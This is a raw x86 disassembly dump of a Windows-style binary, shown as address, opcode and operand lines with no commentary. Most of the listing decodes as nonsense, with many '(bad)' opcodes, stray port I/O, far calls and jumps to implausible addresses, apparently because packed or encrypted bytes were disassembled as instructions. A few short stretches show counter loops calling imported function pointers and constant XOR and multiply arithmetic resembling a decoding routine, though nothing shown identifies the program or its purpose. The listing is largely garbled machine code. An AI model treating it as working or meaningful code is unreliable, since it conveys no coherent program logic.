  4049ef:	dec    eax
  4049f0:	jae    0x4049ae
  4049f2:	mov    ch,0xd6
  4049f4:	out    dx,al
  4049f5:	call   0xca37:0x1768b94b
  4049fc:	mov    eax,DWORD PTR [edi+0x64c5ec80]
  404a02:	pusha  
  404a03:	cmp    BYTE PTR [ebp-0x3da2cd10],bh
  404a09:	loop   0x404a24
  404a0b:	rcr    eax,cl
  404a0d:	retf   
  404a0e:	retf   
  404a0f:	stos   BYTE PTR es:[edi],al
  404a10:	jns    0x4049d2
  404a12:	pop    ebx
  404a13:	pop    edi
  404a14:	in     al,dx
  404a15:	mov    WORD PTR [edi-0x5b],cs
  404a18:	lea    ebp,[edx+0x1f4bb2ad]
  404a1e:	pop    eax
  404a1f:	jle    0x404a9b
  404a21:	retf   
  404a22:	jnp    0x404a93
  404a24:	cmc    
  404a25:	icebp  
  404a26:	arpl   dx,cx
  404a28:	leave  
  404a29:	and    eax,0xd62a476b
  404a2e:	jns    0x404a62
  404a30:	in     eax,0x93
  404a32:	test   al,0xc0
  404a34:	scas   eax,DWORD PTR es:[edi]
  404a35:	pushf  
  404a36:	and    BYTE PTR [ecx+0x28],ah
  404a39:	inc    ecx
  404a3a:	sbb    esp,esp
  404a3c:	xor    eax,0xceb8f20b
  404a41:	mov    esp,0x46e67327
  404a46:	jne    0x5443d9a7
  404a4c:	xchg   edi,eax
  404a4d:	xor    esp,esi
  404a4f:	stos   BYTE PTR es:[edi],al
  404a50:	fstp   TBYTE PTR [ebx]
  404a52:	not    BYTE PTR [eax-0x45]
  404a55:	mov    WORD PTR [eax+0x1a],ds
  404a58:	sbb    DWORD PTR [edi+0x33dbe208],0x12
  404a5f:	sti    
  404a60:	call   DWORD PTR [ecx-0x73]
  404a63:	shl    DWORD PTR [esi],0xc4
  404a66:	adc    al,0xdc
  404a68:	out    dx,al
  404a69:	test   BYTE PTR [ebx+ebx*2],al
  404a6c:	inc    ebx
  404a6d:	repz loop 0x404a29
  404a70:	js     0x404a82
  404a72:	loop   0x404a19
  404a74:	xor    esi,0xffffffe5
  404a77:	push   cs
  404a78:	test   BYTE PTR [esi-0x3755cee],bl
  404a7e:	mov    ds:0xa0c40d4,al
  404a83:	dec    esi
  404a84:	sbb    ecx,edi
  404a86:	xor    al,0x70
  404a88:	ror    DWORD PTR [esi+ebp*8+0x4f],cl
  404a8c:	cwde   
  404a8d:	out    dx,al
  404a8e:	cmp    BYTE PTR es:[ebp+0x1c],dh
  404a92:	fdivr  QWORD PTR [edx+0xb]
  404a95:	sahf   
  404a96:	sbb    bl,BYTE PTR [edx+0x571e8828]
  404a9c:	ds test ebx,edx
  404a9f:	xlat   BYTE PTR ds:[ebx]
  404aa0:	and    eax,0x8e9d3672
  404aa5:	daa    
  404aa6:	sahf   
  404aa7:	push   ebx
  404aa8:	sub    esp,DWORD PTR [edx+edi*4]
  404aab:	dec    edi
  404aac:	mov    dl,0x30
  404aae:	push   ebx
  404aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab0:	mov    al,ds:0xcb3bf110
  404ab5:	jno    0x404a6a
  404ab7:	pop    es
  404ab8:	or     eax,0x7f08b65e
  404abd:	adc    DWORD PTR [edi],edx
  404abf:	mov    ebx,DWORD PTR [esi-0x2f5dd3d0]
  404ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ac6:	sahf   
  404ac7:	xchg   DWORD PTR [ebx+0x71],esp
  404aca:	mov    edx,0xcf932004
  404acf:	jle    0x404aa8
  404ad1:	repz cmp eax,ecx
  404ad4:	xchg   edi,eax
  404ad5:	mov    dh,0x8c
  404ad7:	jmp    0xea0d310d
  404adc:	dec    esp
  404add:	mov    eax,0x7776fd17
  404ae2:	lods   al,BYTE PTR ds:[esi]
  404ae3:	or     edx,ecx
  404ae5:	xor    DWORD PTR [ecx],ecx
  404ae7:	sti    
  404ae8:	pop    ecx
  404ae9:	adc    BYTE PTR [edi-0x3b],ah
  404aec:	mov    ?,WORD PTR [ebx-0x68]
  404aef:	jo     0x404a96
  404af1:	add    eax,0x79830be4
  404af6:	repz sub ebx,edx
  404af9:	pop    ebx
  404afa:	fst    DWORD PTR [eax]
  404afc:	dec    esi
  404afd:	pop    ebp
  404afe:	push   ebp
  404aff:	jge    0x404a8c
  404b01:	mov    ds:0x2dac8ecb,eax
  404b06:	std    
  404b07:	les    edi,FWORD PTR [edx]
  404b09:	rcr    DWORD PTR [ebp+0x130d154b],0xc9
  404b10:	fsin   
  404b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b13:	rol    bh,1
  404b15:	push   ebx
  404b16:	mov    bh,0x35
  404b18:	sub    BYTE PTR [edx+0x6a32a7d4],0xd6
  404b1f:	sub    esp,DWORD PTR [ebx+ecx*8-0x46]
  404b23:	fisub  WORD PTR [edi+0x7a]
  404b26:	(bad)  
  404b27:	call   DWORD PTR [eax+0x771c2cf7]
  404b2d:	addr16 or al,0x55
  404b30:	dec    esi
  404b31:	int3   
  404b32:	or     DWORD PTR [edi+0x357aa914],edx
  404b38:	pop    ebp
  404b39:	push   DWORD PTR [esi+edi*4+0x58]
  404b3d:	aas    
  404b3e:	fs pop ebx
  404b40:	dec    edx
  404b41:	jo     0x404b9b
  404b43:	fbstp  TBYTE PTR [esi-0x4c]
  404b46:	jns    0x404bae
  404b48:	cdq    
  404b49:	mov    BYTE PTR [edi-0x58],bh
  404b4c:	hlt    
  404b4d:	in     eax,0x54
  404b4f:	in     eax,0x4d
  404b51:	dec    esi
  404b52:	pusha  
  404b53:	or     BYTE PTR [edx],cl
  404b55:	mov    eax,ds:0xc751a5b1
  404b5a:	add    al,0xd6
  404b5c:	in     al,0xb2
  404b5e:	imul   esi,DWORD PTR [edx+0x6a],0xeb2d5ad9
  404b65:	(bad)  
  404b66:	shl    BYTE PTR [edx-0x2927ed4e],1
  404b6c:	inc    esi
  404b6d:	ret    
  404b6e:	jb     0x404b66
  404b70:	dec    edx
  404b71:	mov    al,ds:0xeca5f049
  404b76:	mov    esp,?
  404b78:	pop    esi
  404b79:	sub    DWORD PTR [edi-0x53],ecx
  404b7c:	jmp    0x404bd8
  404b7e:	stos   BYTE PTR es:[edi],al
  404b7f:	mov    eax,ds:0xa4c798d6
  404b84:	pusha  
  404b85:	jl     0x404bae
  404b87:	out    dx,al
  404b88:	push   0x37
  404b8a:	push   0x47
  404b8c:	retf   
  404b8d:	shl    esi,0xad
  404b90:	fwait
  404b91:	xor    cl,BYTE PTR [esp+esi*8-0x454508d0]
  404b98:	xor    eax,0x3f9de1a5
  404b9d:	aaa    
  404b9e:	mov    bh,0x31
  404ba0:	push   ss
  404ba1:	jl     0x404ba3
  404ba3:	into   
  404ba4:	xor    eax,0xf969e7b
  404ba9:	sub    edx,DWORD PTR [esi]
  404bab:	lods   al,BYTE PTR ds:[esi]
  404bac:	sub    al,0xfe
  404bae:	stos   DWORD PTR es:[edi],eax
  404baf:	mov    edi,0x93bddac3
  404bb4:	(bad)  
  404bb5:	pusha  
  404bb6:	jp     0x404b88
  404bb8:	ja     0x404c26
  404bba:	les    esp,FWORD PTR [ecx+eax*2]
  404bbd:	fcmove st,st(2)
  404bbf:	test   al,0x87
  404bc1:	mov    esp,0xc323a283
  404bc6:	mov    esp,DWORD PTR [edx+0xd]
  404bc9:	hlt    
  404bca:	int    0x51
  404bcc:	pop    es
  404bcd:	test   BYTE PTR [ecx+0x5a],bh
  404bd0:	stos   BYTE PTR es:[edi],al
  404bd1:	ins    DWORD PTR es:[edi],dx
  404bd2:	sub    al,0x1
  404bd4:	adc    bl,BYTE PTR [edx-0x6671701a]
  404bda:	mov    bl,0xac
  404bdc:	(bad)  
  404bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bde:	adc    BYTE PTR es:[edx-0x1],cl
  404be2:	shl    esp,1
  404be4:	xchg   edx,eax
  404be5:	cmp    edi,DWORD PTR [esi+0x7bf9527c]
  404beb:	int    0xb
  404bed:	out    0x64,eax
  404bef:	repnz dec ecx
  404bf1:	mov    ecx,0x9a965473
  404bf6:	lahf   
  404bf7:	xor    al,0x52
  404bfa:	loop   0x404bd2
  404bfc:	retf   
  404bfd:	add    ch,BYTE PTR es:[edi+0x65]
  404c01:	push   ebp
  404c02:	dec    esp
  404c03:	int3   
  404c04:	loopne 0x404c7f
  404c06:	add    bh,BYTE PTR [eax]
  404c08:	test   BYTE PTR [edi],ch
  404c0a:	pop    ds
  404c0b:	xor    eax,0xffbf6604
  404c10:	js     0x404bea
  404c12:	popa   
  404c13:	xor    dl,BYTE PTR [eax-0x23e46c8f]
  404c19:	push   eax
  404c1a:	pop    ebp
  404c1b:	test   BYTE PTR [edx+0x423e8b56],ch
  404c21:	data16 xlat BYTE PTR ds:[ebx]
  404c23:	js     0x404c97
  404c25:	into   
  404c26:	sbb    eax,ebp
  404c28:	push   ss
  404c29:	xor    eax,0x359339ab
  404c2e:	retf   
  404c2f:	xor    WORD PTR [edi+0x14],si
  404c33:	jge    0x404bf7
  404c35:	push   cs
  404c36:	es stos DWORD PTR es:[edi],eax
  404c38:	pop    esp
  404c39:	push   es
  404c3a:	repz push WORD PTR [eax]
  404c3e:	xor    ebx,ebx
  404c40:	sbb    cl,0xf1
  404c43:	xchg   edx,eax
  404c44:	push   ecx
  404c45:	sbb    DWORD PTR [edi-0x5510cff],eax
  404c4b:	xchg   edx,eax
  404c4c:	mov    ?,WORD PTR [ebp+0x35]
  404c4f:	idiv   DWORD PTR [ebx-0x55]
  404c52:	dec    ebp
  404c53:	test   BYTE PTR [ebx+ebx*1-0x210e0f5],dl
  404c5a:	xor    eax,0x8aa9ba49
  404c5f:	loope  0x404cbb
  404c61:	jg     0x404c18
  404c63:	scas   al,BYTE PTR es:[edi]
  404c64:	cld    
  404c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c66:	fwait
  404c67:	sbb    dl,BYTE PTR [ecx-0x1364e898]
  404c6d:	mov    esi,0xb27d1798
  404c72:	jmp    0x1f01af62
  404c77:	mov    eax,ds:0xf8d2ef51
  404c7c:	pop    eax
  404c7d:	imul   ebp,DWORD PTR [esi+0x2d],0x9bdc6176
  404c84:	std    
  404c85:	mov    BYTE PTR [ebx-0x15],dl
  404c88:	inc    ecx
  404c89:	jno    0x404ccc
  404c8b:	cmp    eax,0x2acbd01a
  404c90:	or     dh,al
  404c92:	push   ss
  404c93:	test   DWORD PTR [ebx],edx
  404c95:	mov    ch,0x3b
  404c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c98:	add    al,0x64
  404c9a:	xchg   esi,eax
  404c9b:	xor    al,0xb1
  404c9d:	mov    esp,0x788ef4fd
  404ca2:	stos   DWORD PTR es:[edi],eax
  404ca3:	icebp  
  404ca4:	fsubr  DWORD PTR [esi]
  404ca6:	adc    eax,0xf4e37596
  404cab:	jnp    0x404cd3
  404cad:	adc    eax,0x1f9951cf
  404cb2:	push   edx
  404cb3:	ret    
  404cb4:	xor    al,0xfa
  404cb6:	aaa    
  404cb7:	sar    BYTE PTR [esp+edx*8-0x2a84aa31],0xd8
  404cbf:	(bad)  
  404cc2:	in     eax,0x80
  404cc4:	and    al,0x24
  404cc6:	jl     0x404d02
  404cc8:	add    eax,0xfc3082a1
  404ccd:	xlat   BYTE PTR ds:[bx]
  404ccf:	and    al,0xf4
  404cd1:	mov    edi,0x80e91d0f
  404cd6:	push   esp
  404cd7:	ds test al,0xa5
  404cda:	and    BYTE PTR [eax+0x1e1afa4b],0xbb
  404ce1:	int3   
  404ce2:	sbb    al,0x10
  404ce4:	inc    edx
  404ce5:	inc    ecx
  404ce6:	out    0xf2,eax
  404ce8:	std    
  404ce9:	cld    
  404cea:	add    eax,DWORD PTR [eax-0x7e]
  404ced:	arpl   WORD PTR [ecx-0x208660a2],di
  404cf3:	sbb    BYTE PTR [ebp+0x1c04cba0],al
  404cf9:	out    0x55,al
  404cfb:	(bad)  
  404cfc:	xchg   edx,eax
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x2daa7d7b
  404d49:	mov    ah,0x7f
  404d4b:	js     0x404d68
  404d4d:	das    
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404cfe
  404d55:	dec    esp
  404d56:	xchg   DWORD PTR [eax-0x5518c072],edi
  404d5c:	xchg   ebx,eax
  404d5d:	mov    bh,0x14
  404d5f:	or     esi,esi
  404d61:	mov    al,ds:0xe5d18103
  404d66:	push   ss
  404d67:	outs   dx,DWORD PTR ds:[esi]
  404d68:	jmp    0xa0c4192d
  404d6d:	int    0x36
  404d6f:	je     0x404d90
  404d71:	push   esi
  404d72:	inc    esi
  404d73:	out    dx,eax
  404d74:	sub    al,0x71
  404d76:	push   ecx
  404d77:	call   0xfab9:0xac4e6721
  404d7e:	mov    ebx,0x7cf19153
  404d83:	aaa    
  404d84:	sub    edi,0x1f
  404d87:	and    eax,0x7960d5a5
  404d8c:	jl     0x404d35
  404d8e:	fisttp DWORD PTR [eax+eax*8-0x10362443]
  404d95:	xchg   esi,eax
  404d96:	retf   
  404d97:	clc    
  404d98:	xor    DWORD PTR ds:0xebbd30fa,0xfffffffd
  404d9f:	or     eax,0xcc7e6e2f
  404da4:	sti    
  404da5:	mov    bh,0x9a
  404da7:	ja     0x404e01
  404da9:	cmp    BYTE PTR [esi],dl
  404dab:	rcr    BYTE PTR [edx-0x5c],0x26
  404daf:	jmp    0x404daf
  404db1:	pop    eax
  404db2:	cdq    
  404db3:	inc    esi
  404db4:	mov    eax,0xf364db0c
  404db9:	adc    BYTE PTR [edi+0x10],bl
  404dbc:	mov    ecx,0xbf94b9e9
  404dc1:	and    BYTE PTR [edx+0x68],bl
  404dc4:	push   cs
  404dc5:	leave  
  404dc6:	pushf  
  404dc7:	jge    0x404d6d
  404dc9:	mov    esi,0x532892f4
  404dce:	stos   BYTE PTR es:[edi],al
  404dcf:	fwait
  404dd0:	scas   al,BYTE PTR es:[edi]
  404dd1:	cmp    edi,0xffffffef
  404dd4:	jmp    0xac24a64b
  404dd9:	sbb    BYTE PTR [ebx-0x5],ah
  404ddc:	mov    ds:0xed676a04,eax
  404de1:	shl    DWORD PTR [eax-0x4f],cl
  404de4:	hlt    
  404de5:	js     0x404d79
  404de7:	xor    DWORD PTR [eax],0x30
  404dea:	test   DWORD PTR [eax-0x74],0xb7ec5210
  404df1:	dec    ebp
  404df2:	dec    ecx
  404df3:	inc    esi
  404df4:	out    0x53,eax
  404df6:	ror    DWORD PTR [edi],0xf2
  404df9:	sbb    eax,0xe6c4aace
  404dfe:	and    DWORD PTR [esi],edx
  404e00:	fs stc 
  404e02:	cmp    eax,0x4f3672bc
  404e07:	test   al,0xc
  404e09:	sbb    al,ch
  404e0b:	pop    ds
  404e0c:	test   al,0x37
  404e0e:	imul   ebx,ecx,0xffffffbb
  404e11:	lea    esp,[ecx]
  404e13:	repnz dec edi
  404e15:	add    edi,DWORD PTR [esi]
  404e17:	(bad)  
  404e18:	mov    edx,0x6316d179
  404e1d:	xor    bh,ch
  404e1f:	xor    cl,cl
  404e21:	sub    eax,0xd9c7d003
  404e26:	sbb    BYTE PTR [eax],dl
  404e28:	rcl    ebx,cl
  404e2a:	or     esp,esi
  404e2c:	pop    esp
  404e2d:	sti    
  404e2e:	or     BYTE PTR [edi],al
  404e30:	and    al,0xa1
  404e32:	xchg   ebx,eax
  404e33:	adc    DWORD PTR [eax-0x1a],ebp
  404e36:	push   es
  404e37:	xor    DWORD PTR [edx],0xa6f89068
  404e3d:	(bad)  
  404e3e:	test   ax,0x93c0
  404e42:	rcr    BYTE PTR [eax],1
  404e44:	aam    0x74
  404e46:	fild   WORD PTR [eax-0x59862275]
  404e4c:	cmc    
  404e4d:	sbb    BYTE PTR [eax+0x28],cl
  404e50:	lock int 0x72
  404e53:	(bad)  
  404e54:	cmp    ebp,DWORD PTR [ecx]
  404e56:	mov    edx,0xe269861
  404e5b:	push   ebp
  404e5c:	xor    dh,BYTE PTR [ecx+0x48]
  404e5f:	sbb    ebp,edx
  404e61:	int    0x41
  404e63:	loope  0x404e25
  404e65:	xchg   cl,cl
  404e67:	lds    ecx,FWORD PTR [ebx-0x75]
  404e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e6b:	fcomi  st,st(6)
  404e6d:	pusha  
  404e6e:	fwait
  404e6f:	pop    esp
  404e70:	jmp    edx
  404e72:	push   es
  404e73:	sbb    edi,DWORD PTR [eax+0x29b8b48d]
  404e79:	xor    cl,BYTE PTR [eax-0x57]
  404e7c:	out    0xd4,eax
  404e7e:	push   ds
  404e7f:	int3   
  404e80:	and    al,0x9
  404e82:	mov    bl,0x5c
  404e84:	mov    eax,ds:0xfe830d8b
  404e89:	arpl   WORD PTR [ebx-0x67],sp
  404e8c:	lock cdq 
  404e8e:	jb     0x404e4b
  404e90:	jbe    0x404e1e
  404e92:	loope  0x404eee
  404e94:	mov    al,ds:0xcf3929de
  404e99:	dec    edi
  404e9a:	rcl    al,0x9
  404e9d:	mov    si,0x548
  404ea1:	fwait
  404ea2:	shl    ebx,1
  404ea4:	jmp    0xe85be306
  404ea9:	ret    
  404eaa:	inc    edi
  404eab:	pop    edi
  404eac:	push   esi
  404ead:	jge    0x404f2d
  404eaf:	lods   al,BYTE PTR ds:[esi]
  404eb0:	cdq    
  404eb1:	pop    esi
  404eb2:	aad    0x1c
  404eb4:	js     0x404e44
  404eb6:	adc    BYTE PTR [ebp-0x8194c9e],ch
  404ebc:	or     al,0xa9
  404ebe:	dec    ebx
  404ebf:	mov    edx,esi
  404ec1:	add    BYTE PTR [esi],bh
  404ec3:	test   al,0x55
  404ec5:	sbb    eax,0x2d3eb986
  404eca:	fdivr  st(1),st
  404ecc:	lahf   
  404ecd:	cmp    BYTE PTR [esi+0x1735e051],al
  404ed3:	ja     0x404ea7
  404ed5:	mov    ss,WORD PTR [edi+0x41]
  404ed8:	out    0xc6,al
  404eda:	retf   0xd687
  404edd:	mov    ch,0x42
  404edf:	xor    esi,DWORD PTR ds:0xcf6ca8a
  404ee5:	pop    eax
  404ee6:	adc    bh,al
  404ee8:	nop
  404ee9:	jo     0x404ebd
  404eeb:	ret    0x54e7
  404eee:	es aad 0x5d
  404ef1:	adc    al,0xea
  404ef3:	cmp    BYTE PTR [edi+0xc],0xc4
  404ef7:	call   0x2aca:0x5e4e0deb
  404efe:	adc    dl,BYTE PTR [eax+0x593e6b59]
  404f04:	mov    eax,0x4e234e7
  404f09:	ror    BYTE PTR [ebx+0x5828a02b],1
  404f0f:	sub    eax,0x3010d001
  404f14:	dec    edi
  404f15:	or     eax,0xeed7dd55
  404f1a:	mov    cl,BYTE PTR [ecx]
  404f1c:	mov    WORD PTR [edx+0x2b98a545],ds
  404f22:	or     DWORD PTR [edi+0x3],0x5ea78f48
  404f29:	enter  0x4d05,0xcd
  404f2d:	sbb    al,0xca
  404f2f:	test   al,0xfb
  404f31:	sub    DWORD PTR [edi+0x150b51c7],ebp
  404f37:	sti    
  404f38:	inc    esp
  404f39:	inc    ebx
  404f3a:	add    bh,al
  404f3c:	inc    ebp
  404f3d:	clc    
  404f3e:	test   DWORD PTR ss:[eax+edi*8+0x458b05c7],ebx
  404f46:	inc    ebx
  404f47:	add    BYTE PTR [eax+eax*1],bl
  404f4a:	add    BYTE PTR [eax],al
  404f4c:	cmp    DWORD PTR ds:0x43458b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43458b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43458b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43458b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4344f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434593,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434593
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434593,edx
  404fbc:	cmp    DWORD PTR ds:0x434593,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434749
  404fce:	push   0x4346ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434593,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434537
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434537,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	ret    0x113
  405052:	ja     0x4050cf
  405054:	sub    DWORD PTR [esi+0x7e],edi
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x4050cc
  40505c:	jp     0x40507f
  40505e:	mov    bh,0x51
  405060:	shl    DWORD PTR [edx],cl
  405062:	jne    0x405025
  405064:	rcr    DWORD PTR [ebp+0x2200255e],cl
  40506a:	imul   BYTE PTR [eax]
  40506c:	into   
  40506d:	icebp  
  40506e:	in     al,dx
  40506f:	xlat   BYTE PTR ds:[ebx]
  405070:	iret   
  405071:	(bad)  
  405072:	mov    dl,0xdb
  405074:	sbb    edi,DWORD PTR [edi+0x2c83bc17]
  40507a:	ds push eax
  40507c:	push   cs
  40507d:	bound  esp,QWORD PTR [edi+0x35a50a1d]
  405083:	pushf  
  405084:	xchg   ecx,eax
  405085:	lods   al,BYTE PTR ds:[esi]
  405086:	int3   
  405087:	sub    bh,BYTE PTR [edi-0x6d177ae9]
  40508d:	mov    cl,0xdf
  40508f:	in     eax,0x9a
  405091:	jno    0x4050e8
  405093:	inc    edi
  405094:	sbb    BYTE PTR [esi+0x4f4e6e84],0x9f
  40509b:	dec    esi
  40509c:	push   cs
  40509d:	imul   esi,edi,0x42
  4050a0:	test   BYTE PTR [edx+0x689eb0b1],bh
  4050a6:	jne    0x405040
  4050a8:	dec    ecx
  4050a9:	push   0x3d
  4050ab:	xor    eax,0x1ac0e22e
  4050b0:	aam    0x3e
  4050b2:	push   ecx
  4050b3:	push   esp
  4050b4:	mov    eax,ds:0x649ec215
  4050b9:	popf   
  4050ba:	iret   
  4050bb:	adc    BYTE PTR [esi+0x7c],0x86
  4050bf:	out    dx,al
  4050c0:	aam    0xfe
  4050c2:	lock push esp
  4050c4:	psrlw  mm4,QWORD PTR [ebp+0xebbb8ab]
  4050cb:	ret    
  4050cc:	pop    edi
  4050cd:	mov    bl,0xc
  4050cf:	mov    esi,0xe4c0d125
  4050d4:	inc    esp
  4050d5:	sbb    DWORD PTR [esi-0x44b195ec],ebx
  4050db:	mov    edx,0x45ba604b
  4050e0:	(bad)
  4050e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e4:	cs jnp 0x40514a
  4050e7:	aas    
  4050e8:	mov    esi,0xd29cc796
  4050ed:	aam    0xc1
  4050ef:	xchg   BYTE PTR [esi],cl
  4050f1:	sbb    eax,0xd15a3204
  4050f6:	and    edi,DWORD PTR [edi+0x5bf92844]
  4050fc:	in     eax,0xab
  4050fe:	adc    BYTE PTR [esi+0xb],ch
  405101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405102:	push   ss
  405103:	shl    BYTE PTR [ecx-0x5337f7d],0xee
  40510a:	imul   bh
  40510c:	and    dh,BYTE PTR [edi]
  40510e:	call   0xde8d0092
  405113:	mov    esp,0x4fce8f10
  405118:	mov    al,0x4b
  40511a:	sbb    eax,0xed82e622
  40511f:	jne    0x4050f5
  405121:	jmp    0x405168
  405123:	sub    eax,DWORD PTR [ebx-0x1b9dd3bf]
  405129:	leave  
  40512a:	pop    eax
  40512b:	adc    BYTE PTR [eax+0x42e9e077],dh
  405131:	xchg   ebp,eax
  405132:	ror    DWORD PTR [edi],1
  405134:	data16 and al,0x5
  405137:	mov    al,0xea
  405139:	outs   dx,DWORD PTR ds:[esi]
  40513a:	or     al,0x22
  40513c:	pop    ebx
  40513d:	adc    edx,DWORD PTR [edx+eiz*4]
  405140:	lock movs WORD PTR es:[edi],WORD PTR ds:[esi]
  405143:	jle    0x405155
  405145:	fiadd  WORD PTR [edi-0xc]
  405148:	mov    edi,0x5a3e2beb
  40514d:	xor    ebx,edi
  40514f:	sub    esp,DWORD PTR [eax]
  405151:	iret   
  405152:	mov    esi,0xe1a59962
  405157:	jae    0x405153
  405159:	adc    eax,DWORD PTR [ecx-0x5e]
  40515c:	(bad)  
  40515d:	(bad)  
  40515e:	jbe    0x405199
  405160:	arpl   WORD PTR [eax+ebp*2+0x11d8c6f9],sp
  405167:	inc    DWORD PTR [ebx+0x17c03ef8]
  40516d:	cmp    esi,DWORD PTR [eax+ebx*4+0x654f3974]
  405174:	xor    bh,ch
  405176:	sahf   
  405177:	xor    DWORD PTR ds:0x58b6a9a0,ebp
  40517d:	ins    DWORD PTR es:[edi],dx
  40517e:	mov    edx,0x3875dcbd
  405183:	and    BYTE PTR [ecx-0x3f],ah
  405186:	je     0x4051db
  405188:	mov    ecx,0x4b1ab629
  40518d:	fwait
  40518e:	jmp    0x7b58e785
  405193:	inc    esi
  405194:	(bad)  
  405195:	adc    BYTE PTR ds:[edx],dh
  405198:	dec    eax
  405199:	mov    ?,WORD PTR ds:0xf6460c3c
  40519f:	pop    ebp
  4051a0:	xor    eax,0x974c3027
  4051a5:	loop   0x4051f2
  4051a7:	xchg   esi,eax
  4051a8:	jne    0x405178
  4051aa:	dec    esp
  4051ab:	and    dh,0x73
  4051ae:	idiv   DWORD PTR [ecx-0x14]
  4051b1:	xchg   ecx,eax
  4051b2:	sub    eax,0xf335c523
  4051b7:	mov    ds:0xf8c77f51,al
  4051bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bd:	or     DWORD PTR [esi],eax
  4051bf:	(bad)  
  4051c0:	or     dh,ch
  4051c2:	sbb    BYTE PTR [esi],cl
  4051c4:	jne    0x40514c
  4051c6:	push   ebp
  4051c7:	sub    dh,BYTE PTR [esi]
  4051c9:	mov    al,ds:0xf569c832
  4051ce:	cmp    eax,0x7f3378f
  4051d3:	pop    eax
  4051d4:	pop    edi
  4051d5:	not    bh
  4051d7:	mov    BYTE PTR [edi],cl
  4051d9:	repnz add DWORD PTR [ecx],ebp
  4051dc:	das    
  4051dd:	jle    0x40517e
  4051df:	mov    ebp,0x94884af2
  4051e4:	inc    eax
  4051e5:	xor    eax,0x8ab72ed4
  4051ea:	sar    DWORD PTR [esi],1
  4051ec:	mov    eax,0xfef6ed13
  4051f1:	(bad)  
  4051f3:	gs xchg esi,eax
  4051f5:	mov    bh,0x14
  4051f7:	push   ecx
  4051f8:	(bad)  
  4051fa:	jecxz  0x40526e
  4051fc:	mov    esi,0x76c8511e
  405201:	sbb    eax,0x621ffba4
  405206:	std    
  405207:	in     al,dx
  405208:	or     BYTE PTR [esi],ch
  40520a:	std    
  40520b:	int3   
  40520c:	psadbw mm2,QWORD PTR [esp+eiz*2]
  405210:	retf   0x4081
  405213:	push   0xffffffb5
  405215:	pop    esp
  405216:	(bad)  
  405217:	rcr    al,1
  405219:	xchg   edi,eax
  40521a:	jbe    0x405295
  40521c:	adc    eax,0xfe763a8e
  405221:	push   esp
  405222:	add    DWORD PTR [esi],ebx
  405224:	jno    0x4051c6
  405226:	jmp    0x4fbaa6aa
  40522b:	mov    ebp,0x4295590f
  405230:	(bad)  
  405231:	pop    ss
